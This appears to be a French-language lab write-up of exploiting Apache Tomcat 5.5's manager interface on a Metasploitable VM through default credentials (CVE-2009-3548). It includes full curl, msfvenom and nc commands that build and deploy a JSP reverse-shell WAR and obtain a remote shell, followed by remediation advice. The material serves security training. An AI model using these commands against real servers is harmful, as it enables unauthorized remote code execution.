Tomcat Manager — Déploiement d'un WAR malveillant

Exécution de code à distance (RCE) via l'interface d'administration Tomcat protégée par des identifiants par défaut

Service / PortHTTP (Apache Tomcat/Coyote 5.5) — port 8180
CibleMetasploitable 1 — 192.168.56.102
CVECVE-2009-3548 (identifiants manager par défaut)
RésultatShell distant en tant que tomcat55 (compte de service)
Testé parZANNOU Josaphat
Note réseau. Les deux rédacteurs travaillent sur deux réseaux host-only VirtualBox distincts. Cette page utilise le réseau de Josaphat (vboxnet0) : la cible est en 192.168.56.102 et le poste Kali en 192.168.56.1. Côté Jules, le même service se trouve sur 172.28.128.4 (réseau vboxnet1, comme indiqué au sommaire). Seules les adresses IP changent ; la démarche est identique.

1. Identification

Le scan de reconnaissance sur le port 8180 révèle un serveur Apache Tomcat 5.5 (moteur JSP Coyote 1.1). Un Tomcat expose par défaut une application d'administration (/manager) qui permet de déployer des applications web : c'est la première piste à vérifier, car un accès à cette interface équivaut à une exécution de code sur le serveur.

2. Méthode d'identification de la CVE et du module

Avant de chercher un exploit, on teste l'hypothèse la plus simple : l'interface manager est-elle accessible avec les identifiants par défaut de Metasploitable (tomcat:tomcat) ? On interroge deux fois l'URL du manager, sans puis avec authentification, en n'affichant que le code HTTP de réponse :

$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.102:8180/manager/html
401
$ curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.102:8180/manager/html
200

Le code 401 sans authentification puis 200 avec tomcat:tomcat confirment que les identifiants par défaut ouvrent le manager. C'est précisément la faille : le manager autorise le déploiement d'applications web arbitraires, donc un accès au manager permet l'exécution de code à distance (RCE, pour Remote Code Execution).

Question suivante, indépendante de tout outil : cette faiblesse correspond-elle à une vulnérabilité connue et outillée ? On commence par le plus léger (searchsploit), puis on va chercher la CVE précise dans le module Metasploit correspondant :

$ searchsploit tomcat manager

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Apache Tomcat Manager - Application Deployer   | multiple/remote/16317.rb
Apache Tomcat Manager - Application Upload (A  | multiple/remote/31433.rb
---------------------------------------------- ---------------------------------

Une faille connue existe bien : l'abus du Application Deployer du manager. Pour obtenir la CVE exacte et le mécanisme, on lit les informations du module Metasploit correspondant :

$ msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"

       Name: Apache Tomcat Manager Application Deployer Authenticated Code Execution
     Module: exploit/multi/http/tomcat_mgr_deploy
  Disclosed: 2009-11-09
...
Description:
  This module can be used to execute a payload on Apache Tomcat servers that
  have an exposed "manager" application. The payload is uploaded as a WAR archive
  containing a jsp application using a PUT request.
...
References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html

La section References confirme CVE-2009-3548.

Mécanisme. CVE-2009-3548 ne désigne pas un bug de code mais une configuration par défaut dangereuse : Tomcat est livré avec des comptes manager par défaut (tomcat/tomcat, etc.). Le manager expose une fonction de déploiement (/manager/deploy) qui accepte une archive .war et la rend immédiatement accessible comme application web. Un .war peut contenir une page JSP — c'est-à-dire du code Java exécuté côté serveur. En déposant un .war contenant un reverse shell JSP puis en visitant la page, on fait exécuter notre code par le processus Tomcat, avec les droits de l'utilisateur système qui le fait tourner (tomcat55).

3. Démarche d'exploitation

Plutôt que de lancer directement le module Metasploit, on reproduit sa logique à la main (msfvenom + curl) pour comprendre chaque étape. a) On génère d'abord le WAR piégé — un reverse shell JSP qui rappellera le poste Kali (LHOST=192.168.56.1) :

$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o shell.war
Payload size: 1108 bytes
Final size of war file: 1108 bytes
Saved as: shell.war

$ unzip -l shell.war | grep -i jsp
     1498  2026-10-15 20:49   idukjczquyzxqav.jsp

Le nom de la JSP interne est aléatoire (idukjczquyzxqav.jsp ici) ; il servira d'URL pour déclencher le shell.

b) On démarre un listener sur le poste Kali (nc -lvnp 4444) pour recevoir la connexion retour, puis c) on déploie le WAR via le manager, avec les identifiants trouvés à l'étape 2 :

$ curl -s -u tomcat:tomcat -T shell.war "http://192.168.56.102:8180/manager/deploy?path=/shell"
OK - Deployed application at context path /shell

$ curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/list" | grep /shell
/shell:running:0:shell

La réponse OK - Deployed confirme que l'application piégée est en ligne, et /shell:running le reconfirme dans la liste des applications.

d) Enfin, on déclenche le shell en visitant la JSP déployée (son exécution ouvre la connexion vers le listener) :

$ curl -s "http://192.168.56.102:8180/shell/idukjczquyzxqav.jsp"

4. Preuve d'accès obtenu

Dans la session reçue sur le listener nc (port 4444), les commandes exécutées s'exécutent sur la cible :

connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 50464
$ id
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
$ hostname
metasploitable

Le shell est confirmé en tant que tomcat55 (le compte de service qui fait tourner Tomcat) sur l'hôte metasploitable. Il ne s'agit pas de root : l'élévation de privilèges constituera une étape distincte.

5. Remédiation

RECOMMANDATIONS
  • Changer ou supprimer les comptes manager par défaut (tomcat/tomcat, admin…) dans tomcat-users.xml — c'est la cause racine de CVE-2009-3548 ; utiliser des mots de passe forts et uniques.
  • Restreindre l'accès à l'interface manager par adresse IP (valve RemoteAddrValve) et la réserver à un réseau d'administration ; ne jamais l'exposer publiquement.
  • Mettre à jour Tomcat : la version 5.5 est obsolète et n'est plus maintenue.
  • Appliquer le principe de moindre privilège : Tomcat tourne déjà ici sous un compte dédié non privilégié (tomcat55), ce qui limite l'impact direct — mais l'accès obtenu reste un point de départ pour une élévation de privilèges.
